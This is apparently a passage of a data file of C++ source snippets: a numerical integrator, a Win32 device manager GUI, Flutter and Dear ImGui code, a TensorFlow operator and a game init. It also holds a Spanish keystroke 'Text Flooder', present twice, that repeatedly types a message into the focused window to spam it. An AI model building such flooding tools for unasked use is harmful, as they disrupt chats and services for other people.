1.0); \n                std::cout << std::setw(15) << alpha_k; \n                std::cout << std::setw(15) << richardson;\n                std::cout << std::setw(15) << std::log2(diff1 / diff);\n                if (std::abs(richardson) < accuracy) {\n                    std::cout << std::setw(10) << n << std::endl;\n                    std::cout << std::endl;\n                    break;\n                }\n            } else {\n                std::cout << std::setw(45) << \" \";\n            }\n        } else {\n            std::cout << std::setw(65) << \" \";\n        }\n        std::cout << std::setw(10) << n;\n        std::cout << std::endl;\n        prev_prev_integral = prev_integral;\n        prev_integral = integral;\n        n *= 2;\n    }\n    std::cout << std::endl;\n}\n\nvoid Midpoint(double n, std::vector<double> (*func)(double, const std::vector<double> &), std::vector<double> &a, double x0, double xEnd, double accuracy, int eq) {\n    std::vector<std::vector<double>> container;\n    std::cout << std::setw(2)  << \"i\"; \n    std::cout << std::setw(15) << \"A(h_i)\";\n    std::cout << std::setw(20) << \"A(h_(i-1))-A(h_i)\"; \n    std::cout << std::setw(15) << \"alpha_k\";\n    std::cout << std::setw(15) << \"rich-error\"; \n    std::cout << std::setw(15) << \"order\";\n    std::cout << std::setw(10) << \"n\";\n    std::cout << std::endl;\n\n    double prev_prev_integral = 0.0;\n    double prev_integral = 0.0;\n    for (int i = 0; i < 50; i++) {\n        std::vector<double> yn = a;\n        double h = (xEnd - x0) / n;\n        for (int j = 0; j < n; j++) {\n            std::vector<double> k1 = func(x0 + j * h, yn);\n            std::vector<double> k2 = func(x0 + j * h + h * 0.5, yn + 0.5 * h * k1);\n            yn = yn + h * k2;\n        }\n        \n        container.push_back(yn);\n\n        double integral = container[i][eq];\n        std::cout << std::setw(2) << i << std::setw(15) << integral;\n        \n        if (i > 0) {\n            double diff = prev_integral - integral;\n            std::cout << std::setw(20) << diff;\n            if (i > 1) {\n                double diff1 = prev_prev_integral - prev_integral; \n                double alpha_k = diff1 / diff;           \n                double richardson = (diff) / (alpha_k - 1.0); \n                std::cout << std::setw(15) << alpha_k; \n                std::cout << std::setw(15) << richardson;\n                std::cout << std::setw(15) << std::log2(diff1 / diff);\n                if (std::abs(richardson) < accuracy) {\n                    std::cout << std::setw(10) << n << std::endl;\n                    std::cout << std::endl;\n                    break;\n                }\n            } else {\n                std::cout << std::setw(45) << \" \";\n            }\n        } else {\n            std::cout << std::setw(65) << \" \";\n        }\n        std::cout << std::setw(10) << n;\n        std::cout << std::endl;\n        prev_prev_integral = prev_integral;\n        prev_integral = integral;\n        n",
    "#include\"Device.h\"\n#include \"MyWnds.h\"\n#include <CommCtrl.h>\n#include \"Data.hpp\"\n#include <windowsx.h>\n\n//\u521d\u59cb\u5316\u603b\u4e2a\u6570\u4e3a0\nUINT Device::mCount = 0;\n\nHWND Device::DevInfoProc_hwnd;\nUINT Device::DevInfoProc_uMsg;\nWPARAM Device::DevInfoProc_wParam;\nLPARAM Device::DevInfoProc_lParam;\n\nBYTE Device::devInfoFlag;\n\nDevice Device::currentDev = { 0 };\n\n//\u8bbe\u5907\u4fe1\u606f\nLRESULT CALLBACK Device::DevInfoProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {\n\tDevice::DevInfoProc_hwnd = hwnd;\n\tDevice::DevInfoProc_uMsg = uMsg;\n\tDevice::DevInfoProc_wParam = wParam;\n\tDevice::DevInfoProc_lParam = lParam;\n\tswitch (uMsg)\n\t{\n\tcase WM_CTLCOLORSTATIC:\n\t{\n\t\t//\u66f4\u6539\u53ea\u8bfb\u72b6\u6001\u4e0b\u7684\u7f16\u8f91\u6846\u7684\u80cc\u666f\u8272\u4e3a\u767d\u8272\n\t\tMyWnds::hDC = (HDC)Device::DevInfoProc_wParam;\n\t\tSetTextColor(MyWnds::hDC, RGB(0, 0, 0));//\u6587\u5b57\u524d\u666f\u8272\n\t\t//SetBkColor(MyWnds::hDC, RGB(144, 244, 124));//\u6587\u5b57\u80cc\u666f\u8272\n\t\tSetBkMode(MyWnds::hDC, TRANSPARENT);//\u80cc\u666f\u900f\u660e\n\t\tMyWnds::hDC = NULL;\n\t\treturn (INT_PTR)CreateSolidBrush(RGB(255, 255, 255));\n\t}\n\tcase WM_NOTIFY:\n\t\tDevice::DevInfoProc_WM_NOTIFY();\n\t\tbreak;\n\tcase WM_PAINT:\n\t\tDevice::DevInfoProc_WM_PAINT();\n\t\tbreak;\n\tcase WM_CREATE:\n\t\tDevice::DevInfoProc_WM_CREATE();\n\t\tbreak;\n\tdefault://\u672a\u81ea\u5b9a\u4e49\u7684\u5176\u4ed6\u6d88\u606f\n\t\treturn DefWindowProc(hwnd, uMsg, wParam, lParam);//\u9ed8\u8ba4\u7a97\u53e3\u8fc7\u7a0b\n\t}\n\treturn 0;\n}\n\nvoid Device::DevInfoProc_WM_NOTIFY() {\n\tswitch (((LPNMHDR)Device::DevInfoProc_lParam)->code) \n\t{\n\tcase NM_CLICK:case NM_RETURN://\u5355\u51fb\n\t{\n\t\tswitch (LPNMHDR(Device::DevInfoProc_lParam)->idFrom) {\n\t\tcase devSaveSysLinkID:\n\t\t{\n\t\t\tTCHAR tempTCHAR[devIntro];\n\t\t\tEdit_GetText(GetDlgItem(Device::DevInfoProc_hwnd, devIntroEditID), tempTCHAR, devIntro);//\u83b7\u53d6\u4ecb\u7ecd\n\t\t\tif (*tempTCHAR) {\n\t\t\t\t//\u4fee\u6539\u8bbe\u5907\u4ecb\u7ecd\n\t\t\t\t_stprintf_s(Device::currentDev.mIntro, tempTCHAR);\n\t\t\t\tData<Device>::DataModify(_T(\"Device.dat\"), Device::currentDev);\n\t\t\t\t//\u9500\u6bc1\u63a7\u4ef6\n\t\t\t\tDestroyWindow(GetDlgItem(Device::DevInfoProc_hwnd, devSaveSysLinkID));\n\t\t\t\tEdit_SetReadOnly(GetDlgItem(Device::DevInfoProc_hwnd, devIntroEditID), TRUE);//\u8bbe\u7f6e\u53ea\u8bfb\u72b6\u6001\n\t\t\t\t//\u663e\u793a\u201c\u7f16\u8f91\u201d\u63a7\u4ef6\n\t\t\t\tSendMessage(GetDlgItem(Device::DevInfoProc_hwnd, editDevIntroSysLinkID), WM_SETFONT, (WPARAM)MyWnds::currentHFONT, TRUE);\n\t\t\t\tMoveWindow(GetDlgItem(Device::DevInfoProc_hwnd, editDevIntroSysLinkID), int(0.7 * MyWnds::homePageWidth), int(0.4 * MyWnds::homePageHeight), int(0.1 * MyWnds::homePageWidth), int(0.05 * MyWnds::homePageHeight), true);\n\t\t\t\tShowWindow(GetDlgItem(Device::DevInfoProc_hwnd, editDevIntroSysLinkID), SW_SHOW);\n\t\t\t\t//\u91cd\u7ed8\u6574\u4e2a\u7a97\u53e3\n\t\t\t\tInvalidateRect(Device::DevInfoProc_hwnd, NULL, TRUE);\n\t\t\t\tSendMessage(Device::DevInfoProc_hwnd, WM_PAINT, NULL, NULL);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tMessageBox(Device::DevInfoProc_hwnd, _T(\"\u60a8\u7684\u8f93\u5165\u65e0\u6548\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\"), _T(\"\u9519\u8bef\"), MB_OK | MB_ICONERROR);\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t\tcase editDevIntroSysLinkID:\n\t\t{\n\t\t\t//\u9690\u85cf\u201c\u7f16\u8f91\u201d\u63a7\u4ef6\n\t\t\tShowWindow(GetDlgItem(Device::DevInfoProc_hwnd, editDevIntroSysLinkID), SW_HIDE);\n\t\t\t//\u4fdd\u5b58\n\t\t\tCreateWindowEx(\n\t\t\t\t0, _T(\"SysLink\"), _T(\"<A HREF=\\\"\u4fdd\u5b58\\\">\u4fdd\u5b58</A>\"), WS_CHILD | WS_VISIBLE | LWS_TRANSPARENT | WS_TABSTOP,\n\t\t\t\tint(0.7 * MyWnds::homePageWidth), int(0.4 * MyWnds::homePageHeight), int(0.1 * MyWnds::homePageWidth), int(0.05 * MyWnds::homePageHeight),\n\t\t\t\tDevice::DevInfoProc_hwnd, HMENU(devSaveSysLinkID), MyWnds::hInstance, NULL\n\t\t\t);\n\t\t\tSendMessage(GetDlgItem(Device::DevInfoProc_hwnd, devSaveSysLinkID), WM_SETFONT, (WPARAM)MyWnds::currentHFONT, TRUE);\n\n\t\t\tEdit_SetReadOnly(GetDlgItem(Device::DevInfoProc_hwnd, devIntroEditID), FALSE);//\u8bbe\u7f6e\u53ea\u8bfb\u72b6\u6001\n\n\t\t\t//\u91cd\u7ed8\u6574\u4e2a\u7a97\u53e3\n\t\t\tInvalidateRect(Device::DevInfoProc_hwnd, NULL, TRUE);\n\t\t\tSendMessage(Device::DevInfoProc_hwnd, WM_PAINT, NULL, NULL);\n\n\t\t\tbreak;\n\t\t}\n\t\tcase returnSysLinkID:\n\t\t{\n\t\t\t//\u9500\u6bc1\u63a7\u4ef6\n\t\t\tMyWnds::DestroyControl(Device::DevInfoProc_hwnd, { returnSysLinkID, devIntroEditID , editDevIntroSysLinkID ,devSaveSysLinkID});\n\t\t\t//\u521b\u5efa\u63a7\u4ef6\n\t\t\tSendMessage(GetDlgItem(MyWnds::MainWndProc_hwnd, devInfoWndID), WM_CREATE, NULL, NULL);\n\t\t\t//\u66f4\u65b0\u6807\u8bb0\n\t\t\tDevice::devInfoFlag = 0;\n\t\t\t//\u91cd\u7ed8\u6574\u4e2a\u7a97\u53e3\n\t\t\tInvalidateRect(Device::DevInfoProc_hwnd, NULL, TRUE);\n\t\t\tSendMessage(Device::DevInfoProc_hwnd, WM_PAINT, NULL, NULL);\n\t\t\tbreak;\n\t\t}\n\t\tcase dataInfoListID:\n\t\t{\n\t\t\t//\u66f4\u65b0\u70b9\u51fb\u7684\u5217\u8868\u5750\u6807\n\t\t\tMyWnds::x_Listview = LPNMITEMACTIVATE(Device::DevInfoProc_lParam)->iSubItem;\n\t\t\tMyWnds::y_Listview = LPNMITEMACTIVATE(Device::DevInfoProc_lParam)->iItem;\n\t\t\tbreak;\n\t\t}\n\t\tcase dataInfoSysLinkID:\n\t\t{\n\t\t\tif (PNMLINK(Device::DevInfoProc_lParam)->item.iLink == 0)//\u589e\u52a0\n\t\t\t{\n\t\t\t\tMyWnds::dialogFlag = dialogDevAdd;\n\t\t\t\tMyWnds::Dialog();\n\n\t\t\t}\n\t\t\telse if (PNMLINK(Device::DevInfoProc_lParam)->item.iLink == 1)//\u4fee\u6539\n\t\t\t{\n\t\t\t\tif ((MyWnds::x_Listview == -1 && MyWnds::y_Listview == 0) || MyWnds::y_Listview >= ListView_GetItemCount(GetDlgItem(Device::DevInfoProc_hwnd, dataInfoListID))) {\n\t\t\t\t\tMessageBox(Device::DevInfoProc_hwnd, _T(\"\u8bf7\u9009\u62e9\u8981\u4fee\u6539\u7684\u8bbe\u5907\"), _T(\"\u63d0\u793a\"), MB_ICONINFORMATION);\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tMyWnds::dialogFlag = dialogDevModify;\n\t\t\t\t\tMyWnds::Dialog();\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if (PNMLINK(Device::DevInfoProc_lParam)->item.iLink == 2)//\u5220\u9664\n\t\t\t{\n\t\t\t\tTCHAR tempTCHAR[21] = {};\n\t\t\t\tif (MessageBox(Device::DevInfoProc_hwnd, _T(\"\u786e\u5b9a\u8981\u5220\u9664\u8fd9\u4e9b\u8bbe\u5907\u5417\uff1f\"), _T(\"\u63d0\u793a\"), MB_OKCANCEL | MB_ICONINFORMATION) == IDOK) {\n\t\t\t\t\tfor (int y = ListView_GetItemCount(GetDlgItem(Device::D",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todo_list_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// dear imgui, v1.85 WIP\n// (main code and documentation)\n\n// Help:\n// - Read FAQ at http://dearimgui.org/faq\n// - Newcomers, read 'Programmer guide' below for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for details, links and comments.\n\n// Resources:\n// - FAQ                   http://dearimgui.org/faq\n// - Homepage & latest     \n// ://github.com/ocornut/imgui\n// - Releases & changelog  https://github.com/ocornut/imgui/releases\n// - Gallery               https://github.com/ocornut/imgui/issues/4451 (please post your screenshots/video there!)\n// - Wiki                  https://github.com/ocornut/imgui/wiki (lots of good stuff there)\n// - Glossary              https://github.com/ocornut/imgui/wiki/Glossary\n// - Issues & support      https://github.com/ocornut/imgui/issues\n\n// Getting Started?\n// - For first-time users having issues compiling/linking/running or issues loading fonts:\n//   please post in https://github.com/ocornut/imgui/discussions if you cannot find a solution in resources above.\n\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but needs your support to sustain development and maintenance.\n// Businesses: you can support continued development via invoiced technical support, maintenance and sponsoring contracts. Please reach out to \"contact AT dearimgui.com\".\n// Individuals: you can support continued development via donations. See docs/README or web page.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- END-USER GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n  - USING GAMEPAD/KEYBOARD NAVIGATION CONTROLS\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.org/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] INCLUDES\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer\n// [SECTION] ImGuiListClipper\n// [SECTION] STYLING\n// [SECTION] RENDER HELPERS\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] ERROR CHECKING\n// [SECTION] LAYOUT\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] VIEWPORTS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUGGER WINDOW\n\n*/\n\n//-----------------------------------------------------------------------------\n// DOCUMENTATION\n//-----------------------------------------------------------------------------\n\n/*\n\n MISSION STATEMENT\n =================\n\n - Easy to use to create code-driven and data-driven tools.\n - Easy to use to create ad hoc short-lived tools and long-lived, more elaborate tools.\n - Easy to hack and improve.\n - Minimize setup and maintenance.\n - Minimize state storage on user side.\n - Portable, minimize dependencies, run on target (consoles, phones, etc.).\n - Efficient runtime and memory consumption.\n\n Designed for developers and content-creators, not the typical end-user! Some of the current weaknesses includes:\n\n - Doesn't look fancy, doesn't animate.\n - Limited layout features, intricate layouts are typically crafted in code.\n\n\n END-USER GUIDE\n ==============\n\n - Double-click on title bar to collapse window.\n - Click upper right corner to close a window, available when 'bool* p_open' is passed to ImGui::Begin().\n - Click and drag on lower right corner to resize window (double-click to auto fit window to its contents).\n - Click and drag on any empty space to move window.",
    "\r\n#include \"EmbeddedGraphArapGPUOp.h\"\r\n\r\n//==============================================================================================//\r\n\r\nREGISTER_OP(\"EmbeddedGraphArapGpu\")\r\n.Input(\"nodes_translation: float\")\r\n.Input(\"nodes_rotation: float\")\r\n.Output(\"nodes_arap_loss: float\")\r\n.Output(\"d_connection_weights: float\")\r\n.Output(\"d_rotation: float\")\t// output for gradient operator\r\n.Attr(\"character_file_path_eg: string = 'None'\")\r\n.Attr(\"graph_file_path: string = 'None'\")\r\n.Attr(\"number_of_batches_eg: int = 0\")\r\n.Attr(\"max_number_of_node_connections: int = 0\")\r\n.Attr(\"refinement: bool = false\");\r\n\r\n//==============================================================================================//\r\n\r\nextern \"C\" void computeEmbeddedGraphArapGPUOpGPU(EmbeddedGraphArapGPUOpData& data);\r\n\r\n//==============================================================================================//\r\n\r\nEmbeddedGraphArapGPUOp::EmbeddedGraphArapGPUOp(OpKernelConstruction* context)\r\n\t: \r\n\tOpKernel(context) \r\n{\r\n\tOP_REQUIRES_OK(context, context->GetAttr(\"character_file_path_eg\", &characterFilePath));\r\n\tOP_REQUIRES(context,\r\n\t\tcharacterFilePath != std::string(\"None\"),\r\n\t\terrors::InvalidArgument(\"character_file_path_eg not set!\",\r\n\t\t\tcharacterFilePath));\r\n\r\n\tOP_REQUIRES_OK(context, context->GetAttr(\"graph_file_path\", &graphFilePath));\r\n\tOP_REQUIRES(context,\r\n\t\tgraphFilePath != std::string(\"None\"),\r\n\t\terrors::InvalidArgument(\"graph_file_path not set!\",\r\n\t\t\tgraphFilePath));\r\n\r\n\tOP_REQUIRES_OK(context, context->GetAttr(\"number_of_batches_eg\", &data.numberOfBatches));\r\n\r\n\tOP_REQUIRES_OK(context, context->GetAttr(\"max_number_of_node_connections\", &data.maxNumberOfNodeConnections));\r\n\r\n\tbool refinementStep = false;\r\n\tOP_REQUIRES_OK(context, context->GetAttr(\"refinement\", &refinementStep));\r\n\r\n\tsc = new skinnedcharacter();\r\n\tsc->loadCharacter(characterFilePath.c_str());\r\n\teg = new EmbeddedGraph(sc, graphFilePath, refinementStep);\r\n\r\n\t//misc\r\n\tdata.numberOfNodes\t\t\t\t= eg->getBaseGraphMesh()->N;\r\n\r\n\tdata.d_EGNodeToNodeIndices\t\t= eg->getD_EGNodeToNodeIndices();\r\n\tdata.d_EGNodeToNodeOffsets\t\t= eg->getD_EGNodeToNodeOffsets();\r\n\tdata.d_EGNodeToNodeSizes\t\t= eg->getD_EGNodeToNodeSizes();\r\n\tdata.d_EGNodeRigidityWeights\t= eg->getD_EGNodeRigidityWeights();\r\n\tdata.d_EGNodeToBaseMeshVertices = eg->getD_EGNodeToBaseMeshVertices();\r\n\r\n\tdata.d_baseVertices\t\t\t\t= sc->getBaseMesh()->d_vertices;\r\n\r\n\r\n\tint computedMaxNeighbours = -1;\r\n\tint index = -1;\r\n\tfor (int n = 0; n < eg->getEmbeddedNodesNr(); n++)\r\n\t{\r\n\t\tint size = eg->embeddedNodes[n].embeddedNeighbors.size();\r\n\t\tif (size > computedMaxNeighbours)\r\n\t\t{\r\n\t\t\tcomputedMaxNeighbours = size;\r\n\t\t\tindex = n;\r\n\t\t}\r\n\t}\r\n\t\r\n\tstd::ofstream fileGraphLaplacian;\r\n\tfileGraphLaplacian.open(eg->getBaseGraphMesh()->fullPathToMesh + \".laplacian\");\r\n\r\n\tif (fileGraphLaplacian.is_open())\r\n\t{\r\n\t\tfileGraphLaplacian << \"[\" << std::endl;\r\n\r\n\t\tfor (int k = 0; k < eg->getEmbeddedNodesNr(); k++)\r\n\t\t{\r\n\t\t\tfileGraphLaplacian << \"[\";\r\n\t\t\tint setSize = eg->embeddedNodes[k].embeddedNeighbors.size();\r\n\t\t\tint counter = 0;\r\n\t\t\tfor (auto n = eg->embeddedNodes[k].embeddedNeighbors.begin(); n != eg->embeddedNodes[k].embeddedNeighbors.end(); ++n)\r\n\t\t\t{\t\t\r\n\t\t\t\tif (counter == setSize-1 && setSize== computedMaxNeighbours)\r\n\t\t\t\t\tfileGraphLaplacian << std::to_string((*n) + 1);\r\n\t\t\t\telse\r\n\t\t\t\t\tfileGraphLaplacian << std::to_string((*n) + 1) << \", \";\r\n\t\t\t\t\r\n\t\t\t\tcounter++;\r\n\t\t\t}\r\n\t\t\tfor (int rest = counter; rest < computedMaxNeighbours; rest++)\r\n\t\t\t{\r\n\t\t\t\tif (rest == computedMaxNeighbours - 1)\r\n\t\t\t\t\tfileGraphLaplacian << std::to_string(0);\r\n\t\t\t\telse\r\n\t\t\t\t\tfileGraphLaplacian << std::to_string(0) << \", \";\r\n\t\t\t}\r\n\t\t\tif(k == eg->getEmbeddedNodesNr()-1)\r\n\t\t\t\tfileGraphLaplacian << \"]\" << std::endl;\r\n\t\t\telse\r\n\t\t\t\tfileGraphLaplacian << \"],\" << std::endl;\r\n\t\t}\r\n\t\tfileGraphLaplacian << \"]\" << std::endl;\r\n\r\n\t\tfileGraphLaplacian.close();\r\n\t}\r\n\r\n\t//---CONSOLE OUTPUT---\r\n\r\n\tstd::cout << std::endl;\r\n\r\n\tstd::cout << \"|||||||||||||||||||||||||||||||||||||||||||||||||||||||||\" << std::endl;\r\n\r\n\tstd::cout << std::endl;\r\n\r\n\tstd::cout << \"OPERATOR: EmbeddedGraphARAPGpu\" << std::endl;\r\n\r\n\tstd::cout << std::endl;\r\n\r\n\tstd::cout << \"Input(0) nodes translations dimensions: \" << 3 << std::endl;\r\n\tstd::cout << \"\t\" << \"Input(0) nodes translations dimension \" << 0 << \" size: \" << data.numberOfBatches << std::endl;\r\n\tstd::cout << \"\t\" << \"Input(0) nodes translations dimension \" << 1 << \" size: \" << data.numberOfNodes << std::endl;\r\n\tstd::cout << \"\t\" << \"Input(0) nodes translations dimension \" << 2 << \" size: \" << 3 << std::endl;\r\n\r\n\tstd::cout << \"Input(1) nodes rotations dimensions: \" << 3 << std::endl;\r\n\tstd::cout << \"\t\" << \"Input(1) nodes rotations dimension \" << 0 << \" size: \" << data.numberOfBatches << std::endl;\r\n\tstd::cout << \"\t\" << \"Input(1) nodes rotations dimension \" << 1 << \" size: \" << data.numberOfNodes << std::endl;\r\n\tstd::cout << \"\t\" << \"Input(1) nodes rotations dimension \" << 2 << \" size: \" << 3 << std::endl;\r\n\r\n\tstd::cout << std::endl;\r\n\r\n\tstd::cout << \"Output(0) per n",
    "#include <iostream>\n#include <string>\n#include <Windows.h>\n\nbool final = false;\n\nvoid escribir(const std::string& text) {\n    for (char c : text) {\n        INPUT input[2];\n        input[0].type = INPUT_KEYBOARD;\n        input[0].ki.wVk = 0;\n        input[0].ki.wScan = c;\n        input[0].ki.dwFlags = KEYEVENTF_UNICODE;\n        input[0].ki.time = 0;\n        input[0].ki.dwExtraInfo = 0;\n\n        input[1] = input[0];\n        input[1].ki.dwFlags |= KEYEVENTF_KEYUP;\n\n        SendInput(2, input, sizeof(INPUT));\n        Sleep(10);\n    }\n    final = true;\n}\n\nvoid Enter() {\n    keybd_event(VK_RETURN, 0, 0, 0);\n}\n\nvoid soltar_enter() {\n    keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);\n}\n\nvoid flood(const std::string& texto, int cantidadVeces) {\n    for (int i = 0; i < cantidadVeces; ++i) {\n        Sleep(1);\n        \n        escribir(texto + \"\\n\");\n        Enter();\n        soltar_enter();\n\n        Sleep(50);\n    }\n    Sleep(3000);\n}\n\nint main() {\n    SetConsoleTitle(\"Text Flooder\");\n    std::string logo = R\"(\n _______               __        _______ __                 __             \n|_     _|.-----.--.--.|  |_     |    ___|  |.-----.-----.--|  |.-----.----.\n  |   |  |  -__|_   _||   _|    |    ___|  ||  _  |  _  |  _  ||  -__|   _|\n  |___|  |_____|__.__||____|    |___|   |__||_____|_____|_____||_____|__|  \n    )\";\n\n    std::cout << logo << std::endl;\n\n    std::cout << \"Ingresa el texto que quieres escribir: \";\n    std::string texto;\n    getline(std::cin, texto);\n\n    std::cout << \"Ingresa la cantidad de veces que deseas escribir el texto: \";\n    int cantidadVeces;\n    std::cin >> cantidadVeces;\n\n    std::cout << \"\\nPresiona la tecla SHIFT para iniciar el spam.\\n\";\n\n    while (1) {\n        if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {\n            std::cout << \"\\n\\nIniciando spam en 5 segundos...\\n\\n\";\n            \n            Sleep(5000);\n            flood(texto, cantidadVeces);\n\n            while (!final) {\n                Sleep(1000);\n            }\n            \n            std::cout << \"Spam terminado.\" << std::endl;\n            Sleep(2000);\n            return 0;\n        }\n    }\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <string>\n#include <Windows.h>\n\nbool final = false;\n\nvoid escribir(const std::string& text) {\n    for (char c : text) {\n        INPUT input[2];\n        input[0].type = INPUT_KEYBOARD;\n        input[0].ki.wVk = 0;\n        input[0].ki.wScan = c;\n        input[0].ki.dwFlags = KEYEVENTF_UNICODE;\n        input[0].ki.time = 0;\n        input[0].ki.dwExtraInfo = 0;\n\n        input[1] = input[0];\n        input[1].ki.dwFlags |= KEYEVENTF_KEYUP;\n\n        SendInput(2, input, sizeof(INPUT));\n        Sleep(10);\n    }\n    final = true;\n}\n\nvoid Enter() {\n    keybd_event(VK_RETURN, 0, 0, 0);\n}\n\nvoid soltar_enter() {\n    keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);\n}\n\nvoid flood(const std::string& texto, int cantidadVeces) {\n    for (int i = 0; i < cantidadVeces; ++i) {\n        Sleep(1);\n        \n        escribir(texto + \"\\n\");\n        Enter();\n        soltar_enter();\n\n        Sleep(50);\n    }\n    Sleep(3000);\n}\n\nint main() {\n    SetConsoleTitle(\"Text Flooder\");\n    std::string logo = R\"(\n _______               __        _______ __                 __             \n|_     _|.-----.--.--.|  |_     |    ___|  |.-----.-----.--|  |.-----.----.\n  |   |  |  -__|_   _||   _|    |    ___|  ||  _  |  _  |  _  ||  -__|   _|\n  |___|  |_____|__.__||____|    |___|   |__||_____|_____|_____||_____|__|  \n    )\";\n\n    std::cout << logo << std::endl;\n\n    std::cout << \"Ingresa el texto que quieres escribir: \";\n    std::string texto;\n    getline(std::cin, texto);\n\n    std::cout << \"Ingresa la cantidad de veces que deseas escribir el texto: \";\n    int cantidadVeces;\n    std::cin >> cantidadVeces;\n\n    std::cout << \"\\nPresiona la tecla SHIFT para iniciar el spam.\\n\";\n\n    while (1) {\n        if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {\n            std::cout << \"\\n\\nIniciando spam en 5 segundos...\\n\\n\";\n            \n            Sleep(5000);\n            flood(texto, cantidadVeces);\n\n            while (!final) {\n                Sleep(1000);\n            }\n            \n            std::cout << \"Spam terminado.\" << std::endl;\n            Sleep(2000);\n            return 0;\n        }\n    }\n\n    return 0;\n}\n",
    "#include \"game_main.h\"\n#include <vector>\n#include \"GLFW/glfw3.h\"\n#include \"block.h\"\n#include \"config.h\"\n#include \"drawable_object.h\"\n#include \"game_camera.h\"\n#include \"glm/detail/type_vec.hpp\"\n#include \"imgui.h\"\n#include \"imgui.h\"\n#include \"imgui_impl_glfw.h\"\n#include \"imgui_impl_opengl3.h\"\n#include \"subchunk_mesh.h\"\nnamespace {\n    DrawableObject textureText() {\n        std::vector<VertexAttribute> vas{{0.5f, 0.5f, 0.0f, 1.0f, 0.0f, 0.0f, 1.0f, 1.0f},\n                                         {0.5f, -0.5f, 0.0f, 0.0f, 1.0f, 0.0f, 1.0f, 0.0f},\n                                         {-0.5f, -0.5f, 0.0f, 0.0f, 0.0f, 1.0f, 0.0f, 0.0f},\n                                         {-0.5f, 0.5f, 0.0f, 1.0f, 1.0f, 0.0f, 0.0f, 1.0f}};\n        std::vector<GLuint> indices{0, 1, 3, 1, 3, 2};\n        return DrawableObject(vas, indices);\n    }\n}  // namespace\n\nvoid GameMain::init() {\n    debugObj = textureText();\n    debugObj.init();\n    this->window->setMouseCallBack(\n        [&](GLFWwindow *window, double x, double y) { this->processMouseInput(window, x, y); });\n\n    IMGUI_CHECKVERSION();\n    ImGui::CreateContext();\n    auto &io = ImGui::GetIO();\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;\n    io.FontGlobalScale = 2.0;\n    ImGui_ImplGlfw_InitForOpenGL(this->window->window(), true);\n    ImGui_ImplOpenGL3_Init();\n    this->window->onFrame([this](GLFWwindow *) {\n        